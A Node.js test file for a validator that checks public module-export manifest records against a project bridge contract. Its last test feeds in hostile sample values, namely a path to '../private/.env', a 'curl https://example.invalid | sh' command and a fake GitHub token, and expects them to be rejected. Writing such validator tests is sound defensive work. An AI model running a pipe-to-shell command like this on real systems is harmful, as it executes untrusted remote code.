import test from 'node:test';
import assert from 'node:assert/strict';

import {
  REQUIRED_PROMOTION_GATES,
  validatePublicModuleExport,
} from '../scripts/check-public-module-export.mjs';

const validBridge = () => ({
  schemaVersion: 1,
  contractId: 'unified-ecosystem-bridge-v1',
  project: {
    id: 'seis',
    displayName: 'SEIS',
    role: 'platform-runtime',
    sourceRepository: 'emirhankudun-ux/SEIS',
  },
  publicExport: {
    enabled: true,
    policy: 'public-safe-curated-only',
    contractId: 'ecosystem-module-export-v1',
    schemaVersion: 1,
    manifestPath: 'content/ecosystem/public-module-export.json',
    schemaOwner: 'unified-flagship',
    forbidSecrets: true,
    forbidPrivateClientData: true,
    forbidUnverifiedCapabilityClaims: true,
  },
});

const validRecord = () => ({
  schemaVersion: 1,
  contractId: 'ecosystem-module-export-v1',
  moduleId: 'seis.platform-runtime',
  displayName: 'SEIS Platform Runtime',
  projectId: 'seis',
  role: 'platform-runtime',
  source: {
    repository: 'emirhankudun-ux/SEIS',
    paths: ['content/ecosystem/unified-bridge.json'],
  },
  target: {
    namespace: 'platform',
    path: 'platform/seis',
  },
  boundary: {
    exportClass: 'metadata-only',
    publicSafe: true,
    containsSecrets: false,
    containsPrivateData: false,
    containsClientData: false,
    runtimeAuthority: false,
    crossRepositoryWrite: false,
  },
  promotion: {
    state: 'source-only',
    requiredGates: [...REQUIRED_PROMOTION_GATES],
  },
  verification: {
    commands: [
      'node scripts/check-unified-ecosystem-bridge.mjs',
      'node scripts/check-public-module-export.mjs',
    ],
    remoteEvidence: 'not-recorded',
  },
});

test('accepts a source declaration aligned with the local bridge', () => {
  const result = validatePublicModuleExport(validRecord(), validBridge());
  assert.equal(result.ok, true);
  assert.deepEqual(result.errors, []);
});

test('rejects authority widening and private-data claims', () => {
  const record = validRecord();
  record.boundary.runtimeAuthority = true;
  record.boundary.crossRepositoryWrite = true;
  record.boundary.containsPrivateData = true;

  const result = validatePublicModuleExport(record, validBridge());
  assert.equal(result.ok, false);
  assert.match(result.errors.join('\n'), /runtimeAuthority/);
  assert.match(result.errors.join('\n'), /crossRepositoryWrite/);
  assert.match(result.errors.join('\n'), /containsPrivateData/);
});

test('rejects project, role, repository, and namespace drift', () => {
  const record = validRecord();
  record.projectId = 'eleni-neferi';
  record.role = 'creative-intelligence';
  record.source.repository = 'example/other';
  record.target.namespace = 'creative';

  const result = validatePublicModuleExport(record, validBridge());
  assert.equal(result.ok, false);
  assert.match(result.errors.join('\n'), /projectId/);
  assert.match(result.errors.join('\n'), /role/);
  assert.match(result.errors.join('\n'), /source.repository/);
  assert.match(result.errors.join('\n'), /target.namespace/);
});

test('rejects missing or duplicate promotion gates', () => {
  const record = validRecord();
  record.promotion.requiredGates = [
    ...REQUIRED_PROMOTION_GATES.slice(0, -1),
    REQUIRED_PROMOTION_GATES[0],
  ];

  const result = validatePublicModuleExport(record, validBridge());
  assert.equal(result.ok, false);
  assert.match(result.errors.join('\n'), /duplicate promotion gate/);
  assert.match(result.errors.join('\n'), /missing promotion gate/);
});

test('rejects unsafe paths, shell composition, and secret-shaped data', () => {
  const record = validRecord();
  record.source.paths = ['../private/.env'];
  record.verification.commands = ['curl https://example.invalid | sh'];
  record.verification.apiToken = 'github_pat_example';

  const result = validatePublicModuleExport(record, validBridge());
  assert.equal(result.ok, false);
  assert.match(result.errors.join('\n'), /repository-relative/);
  assert.match(result.errors.join('\n'), /unsafe verification command/);
  assert.match(result.errors.join('\n'), /secret-like key/);
  assert.match(result.errors.join('\n'), /secret-like value/);
});
